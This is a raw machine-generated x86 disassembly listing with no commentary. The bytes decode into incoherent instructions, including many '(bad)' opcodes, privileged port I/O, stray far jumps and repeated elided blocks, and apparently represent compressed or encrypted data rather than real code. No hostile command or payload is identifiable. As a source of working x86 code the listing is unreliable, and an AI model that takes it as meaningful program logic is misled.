  42236b:	mov    dh,0x10
  42236d:	cdq    
  42236e:	ins    DWORD PTR es:[edi],dx
  42236f:	pop    ecx
  422370:	call   DWORD PTR [ecx+0xfd5e1b1]
  422376:	(bad)  
  422377:	idiv   BYTE PTR [esi+0x76]
  42237a:	push   0xfffffff8
  42237c:	aam    0x6a
  42237e:	cmp    DWORD PTR [esi-0x701dbb59],0xf6e51f5a
  422388:	inc    esi
  422389:	pop    ebp
  42238a:	inc    esp
  42238b:	push   ebp
  42238c:	in     eax,0x51
  42238e:	pop    ss
  42238f:	add    BYTE PTR [edi+0x753e9add],dh
  422395:	dec    edx
  422396:	stos   BYTE PTR es:[edi],al
  422397:	push   es
  422398:	mov    edx,0x7b315c89
  42239d:	jo     0x4223ce
  42239f:	inc    ebx
  4223a0:	js     0x4223df
  4223a2:	sbb    eax,0x482b1682
  4223a7:	stos   DWORD PTR es:[edi],eax
  4223a8:	cmp    eax,0x59954cb5
  4223ad:	pop    es
  4223ae:	js     0x422375
  4223b0:	add    bl,dh
  4223b2:	lea    eax,[edx+0x460b8149]
  4223b8:	push   ebp
  4223b9:	jmp    0x422375
  4223bb:	fst    QWORD PTR [ebp+0x6ead2b2b]
  4223c1:	jne    0x4223db
  4223c3:	or     edi,DWORD PTR [ebp-0x32488310]
  4223c9:	mov    esi,0xa6272b5a
  4223ce:	ret    0x5534
  4223d1:	jo     0x422449
  4223d3:	retf   
  4223d4:	and    dh,0xdf
  4223d7:	or     al,BYTE PTR [ebx]
  4223d9:	and    eax,0x9c477f8e
  4223de:	mov    cl,0x7e
  4223e0:	(bad)  
  4223e1:	jns    0x422426
  4223e3:	jg     0x42240e
  4223e5:	sbb    eax,0x53d37f4d
  4223ea:	or     eax,esi
  4223ec:	mov    bh,0x36
  4223ee:	cmp    ebp,eax
  4223f0:	aas    
  4223f1:	inc    esi
  4223f2:	pop    DWORD PTR [esi]
  4223f4:	mov    ch,0x61
  4223f6:	and    al,0xf8
  4223f8:	(bad)  
  4223f9:	div    DWORD PTR gs:[edx+ebp*4+0x38]
  4223fe:	xor    edx,DWORD PTR [ecx+0x5a]
  422401:	mov    ch,0xf
  422403:	pop    ebx
  422404:	xchg   ebx,eax
  422405:	ret    0x7ae7
  422408:	addr16 mov ah,0xf6
  42240b:	cmp    DWORD PTR [edx],esi
  42240d:	inc    ebx
  42240e:	or     eax,0xd0
	...
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	mov    ?,WORD PTR [edi+edx*4+0x16d40b0]
  422487:	add    BYTE PTR [ecx+eax*1],al
  42248a:	add    BYTE PTR [eax],al
  42248c:	into   
  42248d:	ja     0x4224fe
  42248f:	cmpxchg DWORD PTR [esi],ebp
  422492:	jecxz  0x42243f
  422494:	inc    esi
  422495:	stos   DWORD PTR es:[edi],eax
  422496:	mov    esp,0xca07e665
  42249b:	clc    
  42249c:	add    BYTE PTR [edx+0x2e],dl
  42249f:	es inc dl
  4224a2:	add    al,0x9e
  4224a4:	sub    al,BYTE PTR [eax]
  4224a6:	fiadd  DWORD PTR [ebx-0x7a7ce1]
  4224ac:	add    edx,ebx
  4224ae:	arpl   di,bx
  4224b0:	xchg   ebx,eax
  4224b1:	pushf  
  4224b2:	stos   BYTE PTR es:[edi],al
  4224b3:	(bad)  [edx+eiz*4-0x5bb883d6]
  4224ba:	dec    DWORD PTR [esi+0x6684e62b]
  4224c0:	out    dx,al
  4224c1:	ror    DWORD PTR [ecx],0xbb
  4224c4:	jo     0x4224d6
  4224c6:	jl     0x422509
  4224c8:	bound  ebx,QWORD PTR [ebx+0x5b4c4062]
  4224ce:	shl    DWORD PTR [edi-0x6b84ef34],0xd2
  4224d5:	mov    edx,0xa52571e2
  4224da:	mov    bh,0x73
  4224dc:	and    DWORD PTR [ecx],edx
  4224de:	push   0x1a
  4224e0:	add    DWORD PTR [esi],edi
  4224e2:	stos   DWORD PTR es:[edi],eax
  4224e3:	sbb    al,0xba
  4224e5:	mov    ebx,DWORD PTR [edx-0x5b0a7ebf]
  4224eb:	xlat   BYTE PTR ds:[ebx]
  4224ec:	(bad)  
  4224ee:	xor    DWORD PTR [ecx-0x35],esp
  4224f1:	mov    edi,0x4a45dcba
  4224f6:	mul    BYTE PTR [ebx+esi*2-0x13]
  4224fa:	loop   0x42248d
  4224fc:	shl    DWORD PTR [edi-0x16304bac],0xdb
  422503:	sub    ah,bh
  422505:	je     0x422586
  422507:	lds    ebp,FWORD PTR [ebx+edx*2-0x5b6f8ebe]
  42250e:	shl    DWORD PTR [edx-0x3b],0x82
  422512:	dec    esi
  422513:	popf   
  422514:	js     0x42256f
  422516:	xor    eax,0x3c632888
  42251b:	test   eax,0xe21f53d9
  422520:	mov    eax,0x8e64e1f
  422525:	sbb    BYTE PTR [edi-0x35],ah
  422528:	clc    
  422529:	(bad)  
  42252a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42252b:	xchg   BYTE PTR [ebp-0x48e4e408],ch
  422531:	mov    dh,0xb8
  422533:	ins    BYTE PTR es:[edi],dx
  422534:	adc    al,0xc3
  422536:	cmp    al,dl
  422538:	mov    ds:0xc2a9ed29,al
  42253d:	sbb    eax,edi
  42253f:	pop    es
  422540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422541:	mov    ds:0x2acf9385,al
  422546:	mov    esi,0x7c304d40
  42254b:	mov    cl,0x5e
  42254d:	push   es
  42254e:	or     eax,0xc69f850c
  422553:	cmp    al,BYTE PTR [esi+0x5b]
  422556:	inc    esp
  422557:	jno    0x4225c0
  422559:	jge    0x4225a2
  42255b:	add    BYTE PTR [edx+0x23ae9c02],0x3
  422562:	dec    eax
  422563:	pushf  
  422564:	enter  0xd147,0xe6
  422568:	adc    dh,BYTE PTR [esi+0x757785de]
  42256e:	imul   ebx,eax,0xffffffef
  422571:	enter  0xacde,0xcd
  422575:	neg    BYTE PTR [esi]
  422577:	out    dx,eax
  422578:	dec    eax
  422579:	je     0x4225b3
  42257b:	into   
  42257c:	xchg   BYTE PTR [ebp+0x5d],bh
  42257f:	add    ecx,DWORD PTR [edx-0x550b3e37]
  422585:	cmp    eax,0xad69d7a3
  42258a:	dec    DWORD PTR [edx+edx*8]
  42258d:	js     0x422562
  42258f:	test   al,0x0
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x48eba2f8]
  422602:	sbb    cl,BYTE PTR [edi+0x44]
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	nop
  42260d:	mov    WORD PTR [ecx],?
  42260f:	jmp    0xbeaf9371
  422614:	pop    es
  422615:	into   
  422616:	adc    al,0xc2
  422618:	dec    esi
  422619:	mov    ebx,DWORD PTR [edi+edx*2+0x71]
  42261d:	dec    eax
  42261e:	inc    eax
  42261f:	sub    BYTE PTR [ebx+0x16],dh
  422622:	push   esi
  422623:	bound  edx,QWORD PTR [edi+0x5d]
  422626:	jmp    0x9cd5:0xef40797f
  42262d:	mov    ds:0xaa42294c,eax
  422632:	inc    edi
  422633:	xchg   edx,eax
  422634:	and    eax,0xc0e24299
  422639:	into   
  42263a:	(bad)  
  42263c:	std    
  42263d:	add    eax,0x154b43b
  422642:	outs   dx,DWORD PTR ds:[esi]
  422643:	bound  eax,QWORD PTR [edx-0x4b]
  422646:	mov    al,ds:0x8e9eb2ed
  42264b:	js     0x422626
  42264d:	ret    0x135e
  422650:	mov    ah,0x5b
  422652:	imul   esi,DWORD PTR [esi],0x5b0cfeb3
  422658:	mov    ds:0x82ac21d2,eax
  42265d:	xor    ah,BYTE PTR [edx]
  42265f:	(bad)  
  422660:	or     ah,BYTE PTR fs:[esi+0x568aaed1]
  422667:	jg     0x4226d1
  422669:	push   ss
  42266a:	pop    es
  42266b:	fisttp WORD PTR [esi]
  42266d:	retf   
  42266e:	fisttp WORD PTR [edx-0x36]
  422671:	xlat   BYTE PTR ds:[ebx]
  422672:	inc    eax
  422673:	das    
  422674:	pop    esi
  422675:	xchg   ebp,eax
  422676:	sbb    al,0x45
  422678:	add    bl,BYTE PTR [ebx]
  42267a:	je     0x4226bc
  42267c:	adc    bh,BYTE PTR [ebx-0x393c8035]
  422682:	leave  
  422683:	into   
  422684:	inc    ebx
  422685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422686:	icebp  
  422687:	mov    edi,0xe7effbe4
  42268c:	int3   
  42268d:	dec    edi
  42268e:	ror    BYTE PTR [ebx],1
  422690:	jbe    0x4226d2
  422692:	pop    ebx
  422693:	pop    ds
  422694:	fs out dx,eax
  422696:	mov    ch,0x8c
  422698:	lock mov ch,0xd6
  42269b:	push   eax
  42269c:	xor    eax,0x4e069615
  4226a1:	inc    edi
  4226a2:	and    ebp,ebx
  4226a4:	stos   DWORD PTR es:[edi],eax
  4226a5:	retf   
  4226a6:	sbb    cl,BYTE PTR [ebx+0xdda8199]
  4226ac:	pushf  
  4226ad:	fild   QWORD PTR [eax+edi*1+0x4203aec0]
  4226b4:	pop    edi
  4226b5:	fimul  DWORD PTR [ecx-0x5c]
  4226b8:	jnp    0x4226c1
  4226ba:	push   0xffffff83
  4226bc:	scas   eax,DWORD PTR es:[edi]
  4226bd:	scas   al,BYTE PTR es:[edi]
  4226be:	test   al,0xe9
  4226c0:	hlt    
  4226c1:	push   ebp
  4226c2:	or     ecx,DWORD PTR [edx+ebp*1+0x58]
  4226c6:	push   esp
  4226c7:	pop    eax
  4226c8:	inc    dx
  4226ca:	sub    al,0x7b
  4226cc:	sub    BYTE PTR [eax],dl
  4226ce:	in     eax,dx
  4226cf:	(bad)
  4226d3:	les    eax,FWORD PTR [edx-0x49]
  4226d6:	fdivr  QWORD PTR [ebx-0x6b]
  4226d9:	add    al,0xac
  4226db:	lock data16 jecxz 0x422693
  4226df:	test   al,0x4d
  4226e1:	popa   
  4226e2:	adc    bh,BYTE PTR [ebx+0x5e]
  4226e5:	xchg   esp,edx
  4226e7:	mul    DWORD PTR [ecx-0x4a33983f]
  4226ed:	adc    eax,0x98d227f1
  4226f2:	or     DWORD PTR [ebx-0x2275ca7],0x5d32832b
  4226fc:	mov    ah,0xa3
  4226fe:	xor    dh,BYTE PTR [esi-0x5a]
  422701:	mov    ebp,0xc8c83cf7
  422706:	into   
  422707:	dec    esp
  422708:	je     0x4226ca
  42270a:	xchg   BYTE PTR [edi],bl
  42270c:	inc    eax
  42270d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42270e:	out    dx,eax
  42270f:	mov    ebx,0x0
	...
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0xd47f01c8
  422781:	push   0x7b
  422783:	push   eax
  422784:	dec    eax
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	mov    ecx,0x1fc71341
  422791:	pop    es
  422792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422793:	push   ds
  422794:	mov    bh,0x41
  422796:	xchg   edx,eax
  422797:	repz je 0x422816
  42279a:	aas    
  42279b:	mov    ecx,0x33835e0e
  4227a0:	cld    
  4227a1:	xchg   edi,eax
  4227a2:	pop    esp
  4227a3:	(bad)  
  4227a4:	pop    esp
  4227a5:	add    ebx,DWORD PTR [ecx]
  4227a7:	mov    ds:0x7ffa572c,eax
  4227ac:	push   esi
  4227ad:	bound  esp,QWORD PTR [ebx-0xe580700]
  4227b3:	ds push es
  4227b5:	sbb    ebp,DWORD PTR [edx+0x25007788]
  4227bb:	and    cl,al
  4227bd:	icebp  
  4227be:	dec    eax
  4227bf:	not    BYTE PTR [edi+0x55b52a66]
  4227c5:	popa   
  4227c6:	push   eax
  4227c7:	mov    ch,0xb
  4227c9:	sbb    BYTE PTR [ecx+0x68],ch
  4227cc:	out    0xe5,al
  4227ce:	sbb    esp,edi
  4227d0:	xchg   BYTE PTR [eax+eiz*4],bl
  4227d3:	or     eax,0x1b02bb46
  4227d8:	ret    
  4227d9:	shl    esi,0xdd
  4227dc:	adc    DWORD PTR [esi],ecx
  4227de:	jne    0x4227df
  4227e0:	es (bad) 
  4227e3:	out    0x89,eax
  4227e5:	dec    esp
  4227e6:	or     eax,0x6aabefed
  4227eb:	je     0x422848
  4227ed:	xchg   ebp,eax
  4227ee:	push   cs
  4227ef:	hlt    
  4227f0:	or     eax,0xf72aba24
  4227f5:	mov    esp,0x360d5d75
  4227fa:	ret    
  4227fb:	jecxz  0x422847
  4227fd:	scas   eax,DWORD PTR es:[edi]
  4227fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ff:	out    0xc9,al
  422801:	adc    DWORD PTR [ecx-0x7e0c3447],esi
  422807:	stos   BYTE PTR es:[edi],al
  422808:	aas    
  422809:	sub    eax,0x104ea951
  42280e:	jmp    0x30f:0x6b9ab785
  422815:	ja     0x42279d
  422817:	(bad)  
  422819:	adc    DWORD PTR [edx+0x1c1b8d37],eax
  42281f:	add    ebp,DWORD PTR [edx+0x72]
  422822:	hlt    
  422823:	jbe    0x422802
  422825:	or     eax,0x756cd156
  42282a:	jae    0x4228a1
  42282c:	or     DWORD PTR [ebx+0x3d],edi
  42282f:	or     BYTE PTR [ebx],dh
  422831:	add    eax,0xe8dfa13c
  422836:	mov    eax,esi
  422838:	dec    edx
  422839:	fidiv  WORD PTR [esi]
  42283b:	repz cmc 
  42283d:	loope  0x422875
  42283f:	aam    0x33
  422841:	xlat   BYTE PTR ds:[ebx]
  422842:	in     al,dx
  422843:	sub    BYTE PTR [edx+0x1a],al
  422846:	dec    eax
  422847:	add    esi,DWORD PTR [edi+edi*2]
  42284a:	icebp  
  42284b:	outs   dx,DWORD PTR ds:[esi]
  42284c:	jmp    0x422807
  42284e:	inc    eax
  42284f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422850:	(bad)  
  422851:	sub    bh,BYTE PTR [ecx+0x29]
  422854:	fwait
  422855:	inc    ebp
  422856:	cmp    esp,DWORD PTR [ecx-0x27]
  422859:	xor    eax,0x91f9ee66
  42285e:	dec    edx
  42285f:	fsub   DWORD PTR [edx]
  422861:	jg     0x42288f
  422863:	inc    esi
  422864:	das    
  422865:	dec    DWORD PTR [esp+edi*1-0x7469a0b0]
  42286c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42286d:	leave  
  42286e:	or     al,0xc2
  422870:	jns    0x42282f
  422872:	push   edi
  422873:	out    dx,eax
  422874:	mov    DWORD PTR [ebx-0x35e07056],ecx
  42287a:	mov    bl,0xc
  42287c:	es jle 0x42288e
  42287f:	repnz loop 0x4228ce
  422882:	inc    ebp
  422883:	and    bh,al
  422885:	cmp    cl,BYTE PTR [ecx-0x47]
  422888:	xor    ah,al
  42288a:	mov    ecx,0xbec11ff5
  42288f:	add    BYTE PTR ss:[eax],al
	...
  4228f2:	add    BYTE PTR [eax],al
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422939
  422901:	sahf   
  422902:	jns    0x42296e
  422904:	dec    esp
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	imul   ebp,DWORD PTR [ebx-0x28],0xffffffcc
  422910:	test   eax,0xf50a820f
  422915:	lahf   
  422916:	es cwde 
  422918:	fsubr  QWORD PTR [ecx+0x24f5b7c6]
  42291e:	adc    ebp,DWORD PTR [esi+0xb]
  422921:	push   di
  422923:	jne    0x42295c
  422925:	xor    bl,BYTE PTR [ecx]
  422927:	inc    esi
  422928:	dec    ecx
  422929:	inc    eax
  42292a:	xor    BYTE PTR [edx-0x63],al
  42292d:	mov    edx,0xbba2e115
  422932:	test   eax,0xc2ea245e
  422937:	or     ah,dl
  422939:	xchg   edx,eax
  42293a:	stc    
  42293b:	ret    0x2fa
  42293e:	out    dx,al
  42293f:	mov    ch,0x23
  422941:	inc    BYTE PTR [edi]
  422943:	dec    ebx
  422944:	mul    ecx
  422946:	jle    0x422976
  422948:	mov    edx,0x809ef725
  42294d:	push   esp
  42294e:	jb     0x422939
  422950:	popf   
  422951:	fadd   QWORD PTR [ebx]
  422953:	mov    ecx,0x697ee277
  422958:	mov    bh,0x95
  42295a:	cmp    eax,0xe49236bf
  42295f:	xlat   BYTE PTR ds:[ebx]
  422960:	fucomp st(1)
  422962:	rcr    dh,cl
  422964:	lock ror ah,1
  422967:	cmp    bh,bl
  422969:	(bad)  
  42296a:	(bad)  
  42296b:	adc    al,0xf7
  42296d:	or     BYTE PTR [ebp+0x1c0e04cc],dl
  422973:	xchg   ecx,eax
  422974:	loopne 0x422990
  422976:	sub    al,0x3e
  422978:	out    dx,eax
  422979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42297a:	and    al,BYTE PTR [ebp+0x40]
  42297d:	and    DWORD PTR [esi-0x1e],esi
  422980:	inc    ecx
  422981:	add    DWORD PTR [ecx+0x4c],ebx
  422984:	(bad)  [edi]
  422986:	test   eax,0x23a8289
  42298c:	test   BYTE PTR [edx+0x1db78e6],ah
  422992:	push   0xffffffe1
  422994:	jle    0x42296b
  422996:	dec    esp
  422997:	sub    ch,al
  422999:	sti    
  42299a:	test   BYTE PTR [ebx+eiz*4],dh
  42299d:	mov    esi,0xfa439f00
  4229a2:	push   ebp
  4229a3:	jns    0x4229a1
  4229a5:	pop    ss
  4229a6:	shl    DWORD PTR [edi],0xf7
  4229a9:	shl    DWORD PTR [eax-0x2d],cl
  4229ac:	clc    
  4229ad:	cmp    BYTE PTR [edx-0x30],ah
  4229b0:	(bad)  
  4229b1:	arpl   bp,di
  4229b3:	scas   al,BYTE PTR es:[edi]
  4229b4:	cdq    
  4229b5:	sbb    DWORD PTR [esi-0x70138edb],0xffffffe2
  4229bc:	into   
  4229bd:	(bad)  [ebx+eax*2-0x14af2fb4]
  4229c4:	sub    ebx,DWORD PTR [ebp+0x732a4f0a]
  4229ca:	mov    ds:0xe8859932,eax
  4229cf:	popf   
  4229d0:	mov    al,ds:0x9563c93e
  4229d5:	outs   dx,DWORD PTR ds:[esi]
  4229d6:	ror    BYTE PTR [esi],0xc9
  4229d9:	in     eax,0xef
  4229db:	aaa    
  4229dc:	xchg   edi,eax
  4229dd:	dec    edi
  4229de:	xlat   BYTE PTR ds:[ebx]
  4229df:	daa    
  4229e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229e1:	aad    0xe
  4229e3:	or     dl,ch
  4229e5:	imul   eax,DWORD PTR [ebp+0x25],0x40a2b063
  4229ec:	(bad)  
  4229ed:	leave  
  4229ee:	dec    eax
  4229ef:	icebp  
  4229f0:	imul   edx,DWORD PTR [edx+0x11],0xfffffff1
  4229f4:	(bad)  
  4229f5:	ds sbb al,0xa5
  4229f8:	pop    esi
  4229f9:	sub    al,0x60
  4229fb:	sti    
  4229fc:	loope  0x422a1b
  4229fe:	mov    eax,ds:0x840bcb29
  422a03:	mov    ecx,0xa7d6b4bb
  422a08:	sub    DWORD PTR [edx+0x755eecf9],ecx
  422a0e:	loop   0x422997
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	in     eax,dx
  422a81:	cmp    DWORD PTR [ecx+0x1715029],ebx
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	or     al,0x43
  422a8e:	jg     0x422aca
  422a90:	mov    dh,0xc2
  422a92:	jns    0x422a2f
  422a94:	scas   eax,DWORD PTR es:[edi]
  422a95:	push   esp
  422a96:	adc    al,0x78
  422a98:	dec    ecx
  422a99:	xchg   esp,eax
  422a9a:	sub    al,0xe5
  422a9c:	popa   
  422a9d:	jnp    0x422a6a
  422a9f:	or     ebx,DWORD PTR [edi-0x44a301f4]
  422aa5:	cmp    eax,0xeb2e1b56
  422aaa:	out    0xa5,al
  422aac:	push   esi
  422aad:	popa   
  422aae:	cli    
  422aaf:	and    dl,BYTE PTR ds:0x161a38a9
  422ab5:	pop    edx
  422ab6:	pop    ebx
  422ab7:	xchg   ebp,eax
  422ab8:	adc    BYTE PTR [edi-0x48],al
  422abb:	add    al,0x3f
  422abd:	call   0xf68fc34b
  422ac2:	dec    ebx
  422ac3:	jmp    0xf829c702
  422ac8:	mov    WORD PTR [edx-0x7a9a562b],ds
  422ace:	je     0x422aa7
  422ad0:	jns    0x422aae
  422ad2:	add    BYTE PTR [ebp-0x1f2db163],dh
  422ad8:	adc    DWORD PTR [ecx-0x1a8e25e9],ebx
  422ade:	les    eax,FWORD PTR [esi]
  422ae0:	cmc    
  422ae1:	aad    0x9b
  422ae3:	mov    edx,0x10322edd
  422ae8:	adc    DWORD PTR [esi-0xd0e7afc],edi
  422aee:	test   al,0xd3
  422af0:	mov    edx,0x7569603c
  422af5:	sub    esp,esp
  422af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422af8:	fucomip st,st(7)
  422afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422afb:	dec    ecx
  422afc:	int    0x75
  422afe:	xor    al,0x8b
  422b00:	stos   DWORD PTR es:[edi],eax
  422b01:	xchg   esi,eax
  422b02:	inc    ecx
  422b03:	addr16 fwait
  422b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b06:	mov    edi,0x1c6c2a91
  422b0b:	cmp    al,0x7d
  422b0d:	(bad)  [edx]
  422b0f:	pop    eax
  422b10:	pop    es
  422b11:	jmp    DWORD PTR [edx-0x15]
  422b14:	std    
  422b15:	cmp    BYTE PTR [ecx+0x528ea90f],dh
  422b1b:	loop   0x422aad
  422b1d:	gs rol bl,cl
  422b20:	mov    eax,esp
  422b22:	jnp    0x422b0b
  422b24:	test   edx,esp
  422b26:	imul   BYTE PTR [ebp+edx*1-0x287481b3]
  422b2d:	mov    eax,ds:0x53270009
  422b32:	ret    0xf6bd
  422b35:	and    cl,BYTE PTR [eax+0x56c1066f]
  422b3b:	jp     0x422ba6
  422b3d:	pop    edi
  422b3e:	scas   al,BYTE PTR es:[edi]
  422b3f:	fwait
  422b40:	imul   edi,esi,0x7e386e4f
  422b46:	inc    edi
  422b47:	fst    QWORD PTR ds:0x9c5c939e
  422b4d:	(bad)
  422b50:	nop
  422b51:	rol    BYTE PTR [eax],0x3f
  422b54:	lock mov bl,0x93
  422b57:	pop    ds
  422b58:	out    0xa8,eax
  422b5a:	(bad)  
  422b5b:	fst    DWORD PTR [eax+0x3f]
  422b5e:	inc    ebx
  422b5f:	cmc    
  422b60:	xor    DWORD PTR [ebx+0x4c],0x7a7944bc
  422b67:	cmc    
  422b68:	pop    esp
  422b69:	inc    edi
  422b6a:	data16 cmp ah,BYTE PTR [eax-0x52]
  422b6e:	rol    bh,1
  422b70:	inc    edi
  422b71:	cmp    edi,DWORD PTR [edx]
  422b73:	in     al,0x6a
  422b75:	not    BYTE PTR [esi]
  422b77:	and    ch,BYTE PTR [ebp-0x34]
  422b7a:	mov    esp,0x7cc77720
  422b7f:	push   esp
  422b80:	mov    dl,0x44
  422b82:	add    eax,0x35339e7
  422b87:	call   0xc88caebb
  422b8c:	mov    edi,0x15b2fd
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x50124d9c]
  422c02:	inc    edi
  422c03:	cld    
  422c04:	push   esp
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	cmp    bl,cl
  422c0e:	inc    esi
  422c0f:	ins    BYTE PTR es:[edi],dx
  422c10:	ins    BYTE PTR es:[edi],dx
  422c11:	sbb    al,bh
  422c13:	dec    ecx
  422c14:	out    dx,eax
  422c15:	pop    ebx
  422c16:	fisttp DWORD PTR [ebx]
  422c18:	aaa    
  422c19:	push   edx
  422c1a:	sub    al,0xbc
  422c1c:	jnp    0x422c8c
  422c1e:	sbb    bl,bl
  422c20:	jnp    0x422bbf
  422c22:	xor    DWORD PTR [edx+0x3c7bf40a],ebx
  422c28:	imul   eax,DWORD PTR ds:0x36ee9d8c,0x7d
  422c2f:	cdq    
  422c30:	std    
  422c31:	cmp    DWORD PTR [ebx-0x4ccf857d],ebx
  422c37:	jmp    DWORD PTR [esi]
  422c39:	iret   
  422c3a:	fidiv  DWORD PTR [ebp+eax*8+0x4ed809ae]
  422c41:	fstp   DWORD PTR [ebx+0x43]
  422c44:	cmc    
  422c45:	mov    edi,0x9f67ce39
  422c4a:	push   0xffffffb5
  422c4c:	sti    
  422c4d:	sbb    BYTE PTR ds:0x7cb7d3e8,ah
  422c53:	(bad)  
  422c54:	adc    edi,DWORD PTR [eax+0x37e90300]
  422c5a:	add    bh,BYTE PTR [eax]
  422c5c:	(bad)  
  422c5d:	mov    WORD PTR [edx+0x58],ds
  422c60:	jge    0x422c6b
  422c62:	push   0xffffffbf
  422c64:	in     eax,0x25
  422c66:	sbb    al,0x9f
  422c68:	adc    BYTE PTR ds:0x53afb25a,al
  422c6e:	push   ebx
  422c6f:	(bad)  [esp+eiz*4-0x367bebe9]
  422c76:	sub    BYTE PTR [ebx],dh
  422c78:	and    DWORD PTR [ebp+0x47],ebp
  422c7b:	mov    BYTE PTR [ebx-0x788074b6],dl
  422c81:	pop    ds
  422c82:	cmp    al,0x8d
  422c84:	adc    eax,0x11e5e524
  422c89:	cwde   
  422c8a:	pop    ebp
  422c8b:	dec    ecx
  422c8c:	hlt    
  422c8d:	das    
  422c8e:	cmp    ebp,esi
  422c90:	or     DWORD PTR [eax+0x4e0abfed],0x375f5e1f
  422c9a:	out    0xf4,eax
  422c9c:	xchg   BYTE PTR [edi+0x4196dea1],bl
  422ca2:	pop    esp
  422ca3:	(bad)  
  422ca4:	aad    0xdb
  422ca6:	cmp    esi,esi
  422ca8:	sub    esi,edx
  422caa:	lods   al,BYTE PTR ds:[esi]
  422cab:	mov    ah,0xfa
  422cad:	xor    BYTE PTR [eax-0x78cef93e],dl
  422cb3:	mov    eax,ds:0x70366639
  422cb8:	add    bl,BYTE PTR [eax]
  422cba:	mov    ah,0x4f
  422cbc:	int    0x11
  422cbe:	jb     0x422ccc
  422cc0:	test   al,0xf2
  422cc2:	pop    ebx
  422cc3:	jp     0x422d0a
  422cc5:	je     0x422cb0
  422cc7:	add    ecx,DWORD PTR [ebx]
  422cc9:	cli    
  422cca:	pop    ebp
  422ccb:	and    esp,DWORD PTR [edi-0x3b]
  422cce:	fild   DWORD PTR [ebx+0x28f1415d]
  422cd4:	scas   al,BYTE PTR es:[edi]
  422cd5:	dec    esi
  422cd6:	popf   
  422cd7:	push   0xd94d2947
  422cdc:	leave  
  422cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cde:	(bad)  
  422cdf:	neg    BYTE PTR [edx+0x3badcac5]
  422ce5:	jnp    0x422d43
  422ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ce8:	xchg   ebx,eax
  422ce9:	icebp  
  422cea:	mov    edx,edi
  422cec:	jne    0x422c88
  422cee:	inc    esi
  422cef:	sub    DWORD PTR ds:0xb75f1bbb,ebx
  422cf5:	jns    0x422d1f
  422cf7:	dec    esp
  422cf8:	and    al,0x48
  422cfa:	ins    BYTE PTR es:[edi],dx
  422cfb:	cmp    al,0x2e
  422cfd:	stos   BYTE PTR es:[edi],al
  422cfe:	sbb    eax,0xcd78afdd
  422d03:	sbb    DWORD PTR [ebx-0x34],0xffffff83
  422d07:	jne    0x422d22
  422d09:	mov    ds:0xcb12f964,eax
  422d0e:	xchg   ebp,eax
  422d0f:	pushf  
	...
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esi,DWORD PTR [edx-0x62]
  422d82:	cwde   
  422d83:	mov    al,ds:0x17358
  422d88:	add    al,0x1
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	adc    edx,ecx
  422d8e:	adc    DWORD PTR [ecx-0x5309b9e9],edx
  422d94:	mov    al,ds:0xe30a138f
  422d99:	(bad)  
  422d9a:	aaa    
  422d9b:	daa    
  422d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d9d:	add    esp,DWORD PTR [eax]
  422d9f:	push   esp
  422da0:	retf   
  422da1:	pop    edi
  422da2:	clc    
  422da3:	xor    ebp,DWORD PTR [edi]
  422da5:	dec    ebp
  422da6:	xchg   esi,eax
  422da7:	mov    al,ds:0xf529c354
  422dac:	ins    BYTE PTR es:[edi],dx
  422dad:	bound  eax,QWORD PTR [esi-0xc]
  422db0:	in     eax,dx
  422db1:	test   DWORD PTR [ecx],ebx
  422db3:	and    eax,0x8705d5ab
  422db8:	push   eax
  422db9:	into   
  422dba:	arpl   WORD PTR [eax-0x50],bp
  422dbd:	icebp  
  422dbe:	push   cs
  422dbf:	sub    ah,BYTE PTR [ebx]
